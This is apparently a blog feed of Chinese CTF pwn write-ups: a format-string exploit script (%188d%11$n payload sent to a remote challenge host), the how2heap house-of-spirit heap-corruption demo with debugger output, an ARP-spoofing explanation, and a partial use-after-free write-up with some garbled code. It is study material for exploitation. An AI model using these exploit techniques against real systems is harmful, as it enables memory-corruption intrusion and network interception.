class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">可以看出，printf的第一个参数（format）地址为：<span class="number">0xffffd920</span></span><br><span class="line"></span><br><span class="line">这个format指向<span class="number">0xffffd94c</span>，指向的这个就是我们char s的地址</span><br><span class="line"></span><br><span class="line">有了这两个地址后，我们就可以计算format与char s的地址偏移，</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0xffffd94c</span> - <span class="number">0xffffd920</span> = <span class="number">0x2c</span> = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">由于这是<span class="number">32</span>位程序，所以每个format参数占<span class="number">4</span>个字节，即有<span class="number">44</span>/<span class="number">4</span>=<span class="number">11</span>个参数，也就是说，第<span class="number">11</span>个参数的地址，就是我们char s开始的地址。</span><br><span class="line"></span><br><span class="line">所以 k=<span class="number">11</span>。</span><br><span class="line"></span><br><span class="line">我们把secret的地址放到char s开始的地方，那第<span class="number">11</span>个参数的内容就是secret的地址。</span><br><span class="line"></span><br><span class="line">这样，我们的%<span class="number">11</span>$n就会把输出字符的个数写进secret。</span><br><span class="line"></span><br><span class="line">所以们需要在 %<span class="number">11</span>$n 构造 <span class="number">192</span> 个字符,即%<span class="number">192</span>d，</span><br><span class="line"></span><br><span class="line">但由于我们在char s开始的地方放下了secret的地址，占了<span class="number">4</span>个字节，所以只需要填充<span class="number">188</span>个字符即可，也就是%<span class="number">188</span>d</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">'./format'</span>)</span><br><span class="line">io=remote(<span class="string">'117.50.13.182'</span>, <span class="number">33865</span>)</span><br><span class="line">payload = p32(<span class="number">0x0804A048</span>) + <span class="string">'%188d'</span> + <span class="string">'%11$n'</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近省赛要开始了，把去年的题目重新详细的做一遍 较为简单&lt;/p&gt;
&lt;p&gt;借鉴了csdn大佬的博客&lt;/p&gt;
&lt;h3 id=&quot;栈溢出后多个地址和参数的排列顺序的规则&quot;&gt;&lt;a href=&quot;#栈溢出后多个地址和参数的排列顺序的规则&quot; class=&quot;headerlink&quot; title
      
    
    </summary>
    
      <category term="2018百越杯" scheme="http://yoursite.com/categories/2018%E7%99%BE%E8%B6%8A%E6%9D%AF/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>shitsco</title>
    <link href="http://yoursite.com/2019/09/03/shitsco/"/>
    <id>http://yoursite.com/2019/09/03/shitsco/</id>
    <published>2019-09-03T06:48:35.954Z</published>
    <updated>2019-09-03T08:00:48.133Z</updated>
    
    <content type="html"><![CDATA[<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先运行程序</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;静态分析&quot;&gt;&lt;a href=&quot;#静态分析&quot; class=&quot;headerlink&quot; title=&quot;静态分析&quot;&gt;&lt;/a&gt;静态分析&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p
      
    
    </summary>
    
      <category term="百度学习" scheme="http://yoursite.com/categories/%E7%99%BE%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ARP欺骗实战</title>
    <link href="http://yoursite.com/2019/09/02/ARP%E6%AC%BA%E9%AA%97%E5%AE%9E%E6%88%98/"/>
    <id>http://yoursite.com/2019/09/02/ARP欺骗实战/</id>
    <published>2019-09-02T08:33:58.475Z</published>
    <updated>2019-09-02T09:24:41.273Z</updated>
    
    <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ARP欺骗的运作原理是由攻击者发送假的ARP数据包到网上，尤其是送到网关上。其目的是要让送至特定的IP地址的流量被错误送到攻击者所取代的地方。因此攻击者可将这些流量另行转送到真正的网关（被动式数据包嗅探，passive sniffing）或是篡改后再转送（中间人攻击，man-<span class="keyword">in</span>-the-middle attack）。攻击者亦可将ARP数据包导到不存在的MAC地址以达到阻断服务攻击的效果，例如netcut软件。</span><br><span class="line">例如某一的IP地址是<span class="number">192.168</span><span class="number">.0</span><span class="number">.254</span>，其MAC地址为<span class="number">00</span><span class="number">-11</span><span class="number">-22</span><span class="number">-33</span><span class="number">-44</span><span class="number">-55</span>，网上上的计算机内ARP表会有这一笔ARP记录。攻击者发动攻击时，会大量发出已将<span class="number">192.168</span><span class="number">.0</span><span class="number">.254</span>的MAC地址篡改为<span class="number">00</span><span class="number">-55</span><span class="number">-44</span><span class="number">-33</span><span class="number">-22</span><span class="number">-11</span>的ARP数据包。那么网上上的计算机若将此伪造的ARP写入自身的ARP表后，计算机若要透过网上网关连到其他计算机时，数据包将被导到<span class="number">00</span><span class="number">-55</span><span class="number">-44</span><span class="number">-33</span><span class="number">-22</span><span class="number">-11</span>这个MAC地址，因此攻击者可从此MAC地址截收到数据包，可篡改后再送回真正的网关，或是什么也不做，让网上无法连线。</span><br><span class="line">简单案例分析：这里用一个最简单的案例来说明ARP欺骗的核心步骤。假设在一个LAN里，只有三台主机A、B、C，且C是攻击者。</span><br><span class="line">攻击者聆听局域网上的MAC地址。它只要收到两台主机洪泛的ARP Request，就可以进行欺骗活动。</span><br><span class="line">主机A、B都洪泛了ARP Request.攻击者现在有了两台主机的IP、MAC地址，开始攻击。</span><br><span class="line">攻击者发送一个ARP Reply给主机B，把此包protocol header里的sender IP设为A的IP地址，sender mac设为攻击者自己的MAC地址。</span><br><span class="line">主机B收到ARP Reply后，更新它的ARP表，把主机A的MAC地址（IP_A, MAC_A）改为（IP_A, MAC_C）。</span><br><span class="line">当主机B要发送数据包给主机A时，它根据ARP表来封装数据包的Link报头，把目的MAC地址设为MAC_C，而非MAC_A。</span><br><span class="line">当交换机收到B发送给A的数据包时，根据此包的目的MAC地址（MAC_C）而把数据包转发给攻击者C。</span><br><span class="line">攻击者收到数据包后，可以把它存起来后再发送给A，达到偷听效果。攻击者也可以篡改数据后才发送数据包给A，造成伤害。</span><br></pre></td></tr></table></figure><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span
      
    
    </summary>
    
      <category term="ARP欺骗" scheme="http://yoursite.com/categories/ARP%E6%AC%BA%E9%AA%97/"/>
    
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>house_of_spirit</title>
    <link href="http://yoursite.com/2019/08/17/house_of_spirit/"/>
    <id>http://yoursite.com/2019/08/17/house_of_spirit/</id>
    <published>2019-08-17T08:36:15.035Z</published>
    <updated>2019-08-24T07:50:57.086Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-源代码"><a href="#0x01-源代码" class="headerlink" title="0x01 源代码"></a>0x01 源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line"><span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">Frees a fake fastbin chunk to get malloc to <span class="keyword">return</span> a nearly-arbitrary pointer.</span><br><span class="line"></span><br><span class="line">通过构造 fake chunk，然后将其 free 掉，就可以在下一次 malloc 时返回 fake chunk 的地址。</span><br><span class="line"></span><br><span class="line">house of spirit 通常用来配合栈溢出使用,通常场景是，栈溢出无法覆盖到的 EIP ，而恰好栈中有一个即将被 free 的堆指针。我们通过在栈上 fake 一个fastbin chunk 接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次 malloc 对应的大小时，由于 fast bin 的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个 fake chunk。所以 fake chunk 的伪造是关键。</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; // this <span class="keyword">is</span> the size</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, <span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        // fake_chunks[<span class="number">9</span>] because <span class="number">0x40</span> / sizeof(unsigned long long) = <span class="number">8</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; // nextsize</span><br><span class="line">    </span><br><span class="line">伪造情况如下</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; p fake_chunks</span><br><span class="line">$<span class="number">4</span> = &#123;<span class="number">0xc2</span>, <span class="number">0x40</span>, <span class="number">0x7fffffffe3ae</span>, <span class="number">0x7ffff7ababe5</span>, <span class="number">0x1</span>, <span class="number">0x4008ed</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x4008a0</span>, <span class="number">0x1234</span>&#125;</span><br><span class="line">Pwndbg&gt; p &amp;fake_chunks</span><br><span class="line">$<span class="number">5</span> = (unsigned long long (*)[<span class="number">10</span>]) <span class="number">0x7fffffffe370</span></span><br><span class="line"></span><br><span class="line">其中 0x40 是chunk size，0x1234 是 nextsize。伪造 chunk 时需要绕过一些检查，首先是标志位，PREV_INUSE 位并不影响 free 的过程，但 IS_MMAPPED 位和 NON_MAIN_ARENA 位都要为零。其次，在 64 位系统中 fast chunk 的大小要在 32~128 字节之间。最后，是 next chunk 的大小，必须大于 2*SIZE_SZ（即大于16），小于 av-&gt;system_mem（即小于128kb），才能绕过对 next chunk 大小的检查。</span><br><span class="line"></span><br><span class="line"><span class="comment">#define PREV_INUSE 0x1</span></span><br><span class="line"><span class="comment">#define IS_MMAPPED 0x2 </span></span><br><span class="line"><span class="comment">#define NON_MAIN_ARENA 0x4</span></span><br><span class="line">size域的最低位表示 此块的上一块(表示连续内存中的上一块)是否在使 用状态, 如果此位为 <span class="number">0</span> 则表示上一块为被释放的块, 这个时候此块的 PREV_SIZE 域保存的是上一块的地 址以便在 free 此块时能够找到上一块的地址并进行 合并操作。第 <span class="number">2</span> 位表示此块是否由 mmap 分配, 如果 此位为 <span class="number">0</span> 则此块是由 top chunk 分裂得来, 否则是由 mmap 单独分配而来。第 <span class="number">3</span> 位表示此块是否不属于 main_arena, 在之后会提到main_arena是主线程用于保存堆状态的结构, 如果此位为 <span class="number">0</span> 则表示此块是在 主线程中分配的</span><br><span class="line"></span><br><span class="line">然后我们修改指针 a 指向fake chunk</span><br><span class="line"></span><br><span class="line">// fake_chunks[<span class="number">9</span>] because <span class="number">0x40</span> / sizeof(unsigned long long) = <span class="number">8</span></span><br><span class="line">      fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; // nextsize</span><br><span class="line">   </span><br><span class="line">      fprintf(stderr, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">      fprintf(stderr, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">      a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">   </span><br><span class="line">      fprintf(stderr, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">      free(a);</span><br><span class="line">  </span><br><span class="line">      fprintf(stderr, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    修改后如下：</span><br><span class="line">Pwndbg&gt; p a                                                        </span><br><span class="line">$11 = (unsigned long long *) 0x7fffffffe380--&gt; $9 = (unsigned long long **) 0x7fffffffe368</span><br><span class="line"></span><br><span class="line">成功指向了 fake chunk。当我free a的时候，系统会将 fake chunk 当做一块fastbins 处理，放到fastbins数组里。当我们再malloc的时候。我们就得到一块指向 stack 的 chunk。</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x7fffffffe370</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">这时如果我们 malloc 一个对应大小的 fast chunk，程序将从 fastbins 中分配出这块被释放的 chunk。</span><br><span class="line">Pwndbg&gt; x/<span class="number">10</span>gx &amp;fake_chunks</span><br><span class="line"><span class="number">0x7fffffffe370</span>: <span class="number">0x00000000000000c2</span>  <span class="number">0x0000000000000040</span></span><br><span class="line"><span class="number">0x7fffffffe380</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7ababe5</span></span><br><span class="line"><span class="number">0x7fffffffe390</span>: <span class="number">0x0000000000000001</span>  <span class="number">0x00000000004008ed</span></span><br><span class="line"><span class="number">0x7fffffffe3a0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffe3b0</span>: <span class="number">0x00000000004008a0</span>  <span class="number">0x0000000000001234</span></span><br><span class="line">所以 house-of-spirit 的主要目的是，当我们伪造的 fake chunk 内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。上面为了方便观察，在 fake chunk 里填充一些字母，但在现实中这些位置很可能是不可控的，而 house-of-spirit 也正是以此为目的而出现的。</span><br><span class="line"></span><br><span class="line">该技术的缺点也是需要对栈地址进行泄漏，否则无法正确覆盖需要释放的堆指针，且在构造数据时，需要满足对齐的要求等。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-源代码&quot;&gt;&lt;a href=&quot;#0x01-源代码&quot; class=&quot;headerlink&quot; title=&quot;0x01 源代码&quot;&gt;&lt;/a&gt;0x01 源代码&lt;/h3&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
      <category term="how2heap" scheme="http://yoursite.com/categories/how2heap/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>two string</title>
    <link href="http://yoursite.com/2019/08/15/two%20string/"/>
    <id>http://yoursite.com/2019/08/15/two string/</id>
    <published>2019-08-15T12:07:48.269Z</published>
    <updated>2019-08-16T04:27:36.402Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE         </span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE</span><br><span class="line"></span><br><span class="line">具体步骤在uaf实例 差不多的题目这里直接简单解题</span><br><span class="line"></span><br><span class="line">漏洞函数</span><br><span class="line"></span><br><span class="line">int sub_E56()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp<span class="number">-4</span>h]</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">"Please input index : "</span>);</span><br><span class="line">  v1 = sub_BE4();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> &amp;&amp; (unsigned int)v1 &gt; <span class="number">0x1F</span> || !qword_202040[v1] )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">"Index error!"</span>);</span><br><span class="line">  free((void *)*qword_202040[v1]);</span><br><span class="line">  free(qword_202040[v1]);</span><br><span class="line">  qword_202040[v1] = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">"Delete success!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uaf漏洞</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Desktop$ ./pwn</span><br><span class="line"><span class="number">1.</span> create string</span><br><span class="line"><span class="number">2.</span> display string</span><br><span class="line"><span class="number">3.</span> delete string</span><br><span class="line"><span class="number">4.</span> merge string</span><br><span class="line"><span class="number">5.</span> merge strings</span><br><span class="line"><span class="number">6.</span> exit</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line">Please enter the size of string : <span class="number">2</span></span><br><span class="line">Please enter the string : <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    create string 的结构</span><br><span class="line">    struct palyer&#123;</span><br><span class="line">    int size；</span><br><span class="line">    int string；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">编写dynelf查看内存结构</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_string</span><span class="params">(size,string)</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span><span class="params">(<span class="string">" "</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span><span class="params">(<span class="string">"1"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">of</span> <span class="title">string</span>：'）</span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">sendline</span>（<span class="title">str</span><span class="params">(size)</span>）</span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">the</span> <span class="title">string</span>：'）</span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">sendline</span> <span class="params">(string)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">display_string</span><span class="params">(index)</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span><span class="params">(<span class="string">" "</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span><span class="params">(<span class="string">"2"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">index</span>：'）</span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">sendline</span><span class="params">(str<span class="params">(index)</span>)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">delete_string</span><span class="params">(index)</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span><span class="params">(<span class="string">" "</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span><span class="params">(<span class="string">"3"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">index</span>：'）</span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">sendline</span><span class="params">(str<span class="params">(index)</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">create_string</span><span class="params">(<span class="number">32</span>,<span class="string">'aaa'</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">create_string</span><span class="params">(<span class="number">32</span>,<span class="string">'bbb'</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">0</span>)</span> ### <span class="title">free</span>掉创建的两个<span class="title">string</span> 接下来就要构造<span class="title">fake</span> <span class="title">chunk</span>进行攻击</span></span><br></pre></td></tr></table></figure><h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 